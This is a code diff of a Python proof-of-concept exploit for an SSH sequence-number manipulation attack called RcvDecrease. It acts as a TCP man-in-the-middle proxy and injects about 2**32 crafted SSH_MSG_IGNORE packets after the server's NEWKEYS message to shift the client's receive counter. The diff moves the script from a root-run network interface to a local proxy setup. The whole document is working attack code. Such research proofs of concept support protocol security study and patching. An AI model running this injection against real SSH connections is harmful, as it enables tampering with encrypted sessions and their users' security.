@@ -1,11 +1,10 @@
 #!/usr/bin/python3
-import sys
 from binascii import unhexlify
-from common import is_root, contains_newkeys, run_tcp_mitm
+from common import contains_newkeys, run_tcp_mitm
 from tqdm import trange
 
 #####################################################################################
-## Proof of Concept for the RcvDecrement technique                                 ##
+## Proof of Concept for the RcvDecrease technique                                  ##
 ##                                                                                 ##
 ## Tested successfully against:                                                    ##
 ## - Dropbear 2022.83 (OpenSSH 9.4p1 Server)                                       ##
@@ -18,19 +17,26 @@ from tqdm import trange
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
-INTERFACE='eth0'
-TARGET_PORT=22
-TARGET_IP = '192.168.22.10'
+# IP and port for the TCP proxy to bind to
+PROXY_IP = '127.0.0.1'
+PROXY_PORT = 2222
+
+# IP and port of the server
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 22
+
+# C.Rcv will be decreased by N
+N = 1
 
 rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
-def inject_rcvdecrement(in_socket, out_socket):
+def inject_rcvdecrease(in_socket, out_socket):
     try:
         while True:
             data = in_socket.recv(4096)
             if contains_newkeys(data):
                 print("[+] SSH_MSG_NEWKEYS sent by server identified!")
-                print("[+] Injecting 2**32 - 1 SSH_MSG_IGNORE packets to decrement C.Rcv!")
-                for _ in trange(2**32 - 1):
+                print(f"[+] Injecting 2**32 - {N} SSH_MSG_IGNORE messages to decrease C.Rcv by {N}!")
+                for _ in trange(2**32 - N):
                     out_socket.send(rogue_msg_ignore)
             if len(data) == 0:
                 break
@@ -43,10 +49,6 @@ def inject_rcvdecrement(in_socket, out_socket):
     out_socket.close()
 
 if __name__ == '__main__':
-    if not is_root():
-        print("[!] Script must be run as root!")
-        sys.exit(1)
-
-    print("--- Proof of Concept for RcvDecrement technique ---")
-    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match (C.Rcv = S.Snd - 1).")
-    run_tcp_mitm(TARGET_IP, TARGET_PORT, forward_server_to_client=inject_rcvdecrement)
+    print("--- Proof of Concept for RcvDecrease technique ---")
+    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
+    run_tcp_mitm(PROXY_IP, PROXY_PORT, SERVER_IP, SERVER_PORT, forward_server_to_client=inject_rcvdecrease)
